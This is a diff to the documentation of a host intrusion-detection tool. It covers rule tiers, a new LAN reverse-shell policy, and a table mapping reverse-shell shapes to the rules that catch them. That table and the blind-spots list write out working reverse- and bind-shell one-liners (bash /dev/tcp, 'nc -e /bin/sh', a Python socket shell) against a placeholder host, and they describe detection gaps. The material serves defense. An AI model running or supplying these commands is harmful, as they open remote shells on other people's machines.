@@ -24,7 +24,36 @@ name prefix and family, the required annotations, spec keys (`kprobes`,
 enum, the per-argument-type operator table, the `matchActions` action enum, the
 `rateLimit` spelling and format, the value length caps (Prefix 256, Postfix 127,
 SubString 100), the ≤5 selector / ≤5 matchArgs / ≤4 numeric value / ≤2 action
-limits, and that the `enforce` annotation agrees with the actions in the policy.
+limits, that the `enforce` annotation agrees with the actions in the policy, and
+that `tier` is one of the two words below.
+
+## `moat.omarchy/tier`: detection or signal
+
+Optional, `detection` by default. `signal` says **this rule is a building block,
+not a conclusion** (BASELINE §4a): it is right about what it saw and weak about
+what it means, so it is recorded in full, it is a full trigger for `chain.rs`,
+and it never reaches the badge on its own. It does **not** change the severity —
+chains need `>= medium` triggers and the baseline learns on severity — and it is
+not a suppression.
+
+Two things put a `signal` alert on the badge anyway: the §2b context matrix
+escalating it to high/critical inside a `pkg-install` (a `/tmp` exec inside a
+package install *is* a detection, which is the case these rules were written
+for), and a chain that reached `high` re-stamping it.
+
+Every `signal` policy carries a one-line comment above the annotation saying why
+the rule is weak alone. A `signal` policy may not carry `enforce: kill|deny`:
+a rule that has declared its evidence too weak for the badge must not be able to
+end a process on it, and `check.py` rejects the combination.
+
+The six shipped `signal` policies are `exec-untrusted-home`,
+`exec-untrusted-tmpfs`, `net-first-contact`, `persist-desktop-entry-write`,
+`persist-omarchy-plugin-write` and `persist-omarchy-menu-extension-write`; the
+userland `moat-pkg-subtree-interpreter-spawn` declares the same tier in
+`rules/pkg_subtree.rs`, and `moat-net-first-contact`'s userland half in
+`rules/net_first_contact.rs`. That set is not a guess: it is precisely what the
+noise guard's (now removed) rule-wide fan-out demotion had discovered on this
+machine, once a day, through a circuit breaker that forgets.
 
 ## Policy table
 
@@ -55,7 +84,8 @@ which needs no policy change and no reload.
 | `moat-persist-authorized-keys-write` | critical | `file_post_open` (lsm) | **Sigkill** | `ssh-copy-id` (allowlisted), chezmoi/ansible managing your keys | `matchBinaries NotPostfix` |
 | `moat-persist-git-hook-write` | high | `file_post_open` (lsm) | Post 60s | **frequent on Node repos**: husky, lefthook, pre-commit and direnv all write hooks during `npm install` | `matchBinaries NotPostfix`, or ignore `--scope exe+file` |
 | `moat-persist-agent-config-write` | medium | `file_post_open` (lsm) | Post 300s | **frequent**: the agents rewrite `CLAUDE.md`, `settings.local.json` and `.mcp.json` themselves | `matchBinaries NotPostfix` (editors) |
-| `moat-shell-reverse-shell-connect` | critical | `tcp_connect` (kprobe) | **Sigkill** | a script using `bash /dev/tcp` as a port check against a public host; `nc`/`socat` used deliberately. Private, loopback and link-local destinations never fire | `matchBinaries Postfix` list; add CIDRs to `NotDAddr` |
+| `moat-shell-reverse-shell-connect` | critical | `tcp_connect` (kprobe) | **Sigkill** | a script using `bash /dev/tcp` as a port check against a public host; `nc`/`socat` used deliberately. Private, loopback and link-local destinations never fire here — the private half is `moat-shell-lan-connect` | `matchBinaries Postfix` list; add CIDRs to `NotDAddr` |
+| `moat-shell-lan-connect` | high | `tcp_connect` (kprobe) | Post 60s/process | the same shell/netcat list, but to 10/8, 172.16/12, 192.168/16 or `fc00::/7`. **Hand-run port checks are the whole FP surface**: `bash -c ": < /dev/tcp/192.168.1.1/80"` wait-loops, `nc -z` scans against a NAS, printer, router or container host, wait-for-it.sh in a Makefile. Never kills; loopback and link-local excluded | `matchBinaries Postfix` list; drop CIDRs from `DAddr` |
 | `moat-rootkit-bpf-prog-load` | high | `bpf` (lsm) | Post 60s | **Docker**: containerd/runc load BPF on every container start; also bpftrace, bcc, `perf`, `tc` | `matchBinaries NotIn` |
 | `moat-rootkit-kernel-module-load` | critical | `security_kernel_read_file` (kprobe) | **Sigkill** | dkms / NVIDIA / VirtualBox installs that insmod through a wrapper; matches both `READING_MODULE` (2) and `READING_MODULE_COMPRESSED` (7, Arch `.ko.zst`) | `matchBinaries NotIn` (kmod, systemd, dkms) |
 | `moat-rootkit-ldso-preload-write` | critical | `file_post_open` (lsm) | **Sigkill** | none on a clean Arch desktop | `matchBinaries NotIn` |
@@ -80,16 +110,23 @@ which needs no policy change and no reload.
 | `moat-priv-container-socket-connect` | high | `security_socket_connect` (kprobe) | Post 60s | testcontainers and other libraries that reach the socket through a language runtime rather than the `docker` CLI | `matchBinaries NotPostfix` (the container toolchain) |
 | `moat-persist-git-config-write` | high | `security_file_post_open` (kprobe) | Post 60s | git itself on clone/`git config`/fetch (excluded), TUIs and editors | `matchBinaries NotPostfix` |
 
-8 critical, 21 high, 12 medium, 1 low (42 **detection** policies), plus 3
+Six of these are `signal` rather than `detection` (see the tier section above):
+`exec-untrusted-home`, `exec-untrusted-tmpfs`, `net-first-contact`,
+`persist-desktop-entry-write`, `persist-omarchy-plugin-write`,
+`persist-omarchy-menu-extension-write`. They are recorded and correlated on;
+they do not reach the badge alone.
+
+8 critical, 22 high, 12 medium, 2 low (44 **alerting** policies — 38 `detection`
+tier and the 6 `signal` ones above), plus 3
 `moat-telemetry-*` policies which are records rather than detections and are
-rendered only when their class is on — see docs/SHIPPING.md. 7 policies carry
-`Sigkill`, 38 are report-only. Hook load: 26 programs on the `file_post_open` path (8 as
+rendered only when their class is on — see docs/SHIPPING.md. 4 policies carry
+`Sigkill` and 3 carry `Override` (deny); 37 are report-only. Hook load: 26 programs on the `file_post_open` path (8 as
 LSM hooks, 18 as kprobes on `security_file_post_open`), 4 on
-`security_path_unlink`, 3 on `security_path_truncate`, 3 on `tcp_connect`, 2 on
+`security_path_unlink`, 4 on `tcp_connect`, 3 on `security_path_truncate`, 2 on
 `security_socket_connect`, 2 on `bprm_check_security`, and one each on
-`security_path_rename`, `ptrace_access_check`, `proc_mem_open`, `bpf`,
+`security_path_rename`, `socket_connect`, `ptrace_access_check`, `proc_mem_open`, `bpf`,
 `path_chmod`, `inode_setxattr`, `security_kernel_read_file`. With every
-telemetry class on that becomes 27 on the `file_post_open` path, 4 on
+telemetry class on that becomes 27 on the `file_post_open` path, 5 on
 `tcp_connect` and 2 on `path_chmod`. Everything added
 after the first live run is a **kprobe**: the 19-policy trampoline cap is per
 LSM hook, and a kprobe is not attached through a trampoline. `python3 policies/check.py` prints this table from
@@ -390,6 +427,29 @@ decision is moatd's (contract section 6.4, rule ids `moat-x-*`).
     `net-suspicious-port-egress` ships at medium and moatd raises it to high
     when the process is in a package-manager subtree, because that context only
     exists in userland.
+12. **File descriptors.** No hook Tetragon exposes carries a process's open
+    fds, and there is no selector for "stdin is a socket" — the exec event says
+    what ran, never what it was handed. `moat-shell-stdio-socket` reads
+    `/proc/<pid>/fd/{0,1,2}` of the new process at exec time and resolves any
+    socket inode through `/proc/net/{tcp,tcp6,udp,udp6}`, which is the only way
+    to see an interpreter reverse shell at all (see below).
+
+### Reverse shells: the three shapes and which rule catches each
+
+| Shape | What the kernel sees | Caught by |
+|---|---|---|
+| `bash -i >& /dev/tcp/HOST/4444 0>&1`, `nc -e /bin/sh HOST 4444`, `socat ... EXEC:` | the **shell itself** calls `tcp_connect` | `moat-shell-reverse-shell-connect` (critical, Sigkill) for a public host; `moat-shell-lan-connect` (high, report-only) for 10/8, 172.16/12, 192.168/16, `fc00::/7` |
+| `python -c 'import socket,os,subprocess; s.connect(("HOST",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])'`, and the perl / php / ruby / node / java equivalents | the **interpreter** connects; the shell it execs never touches the network, and interpreters are not in any shell policy's `matchBinaries` | `moat-shell-stdio-socket` (userland): fds 0/1/2 of the new shell are a socket. Critical for an off-machine peer, medium for loopback, LAN included |
+| the pty upgrade — `python -c 'import pty;pty.spawn("/bin/bash")'`, `script /dev/null`, run inside a shell that already has the socket | nothing at all: the socket stays on the parent's stdio and the new shell gets a fresh `/dev/pts/N` | `moat-shell-stdio-socket` rung 2 (high): the shell's stdio is a pty **and the parent's stdio is a socket**. Deliberately not "the parent holds a socket somewhere" — every IDE, language server and dev server does that |
+
+The honest residual: a reverse shell whose stdio is neither a socket nor a pty
+over one — a custom agent that keeps the connection to itself and proxies
+commands into a shell over a pipe, an implant that runs commands with
+`popen()` and posts the output over HTTPS — is invisible to all three rules.
+What is left of it is `moat-net-first-contact` (low, timeline) plus whatever
+else the same process tree does, correlated by `chain.rs`. That is a real
+weakness of the family, not an oversight: at that point nothing about the
+process is shell-shaped, and only the sequence gives it away.
 
 ### Known blind spots (nothing covers these yet)
 
@@ -399,8 +459,13 @@ decision is moatd's (contract section 6.4, rule ids `moat-x-*`).
   would mean a second BPF program per persist rule and was left out for
   desktop cost. Same for writes through an already-open fd inherited across an
   exec.
-* **Bind shells.** `tcp_connect` only sees outbound connections; a shell that
-  listens is not covered (`security_socket_bind` would be the hook).
+* **Bind shells**, in the kernel. `tcp_connect` only sees outbound connections;
+  a shell that listens is not covered by any policy (`security_socket_bind`
+  would be the hook). Since 2026-09-05 the common case is caught in userland
+  anyway: `nc -lvp 4444 -e /bin/sh` hands the accepted socket to the shell on
+  fds 0/1/2, which is `moat-shell-stdio-socket`. What is still missed is the
+  listener that has not been connected to yet, and one that never gives the
+  socket to a shell.
 * **Reads of credentials with non-standard names**, and any credential file in
   a directory this list does not enumerate.
 * **Container-internal activity** is seen as host activity; there is no
